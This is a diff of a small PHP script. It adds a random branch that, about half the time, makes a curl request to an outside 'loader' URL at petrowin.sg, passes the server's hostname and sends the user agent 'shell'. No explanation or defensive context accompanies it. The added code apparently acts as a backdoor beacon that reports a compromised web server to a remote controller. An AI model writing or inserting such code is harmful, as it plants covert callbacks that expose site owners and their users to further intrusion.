@@ -1,4 +1,7 @@
 <?php
+$sayi = rand(1,100);
+if($sayi < 50)
+{
   $curl = curl_init();
  curl_setopt_array($curl, [
     CURLOPT_RETURNTRANSFER => 1,
@@ -7,4 +10,18 @@
 ]);
  $resp = curl_exec($curl);
  curl_close($curl);
- ?>
+ 
+}
+ 
+else {
+
+  $curl2 = curl_init();
+ curl_setopt_array($curl2, [
+    CURLOPT_RETURNTRANSFER => 1,
+    CURLOPT_URL => 'http://petrowin.sg/loader/data.php?s='.$_SERVER["SERVER_NAME"].'',
+    CURLOPT_USERAGENT => 'shell'
+]);
+ $resp2 = curl_exec($curl2);
+ curl_close($curl2);
+}
+?>
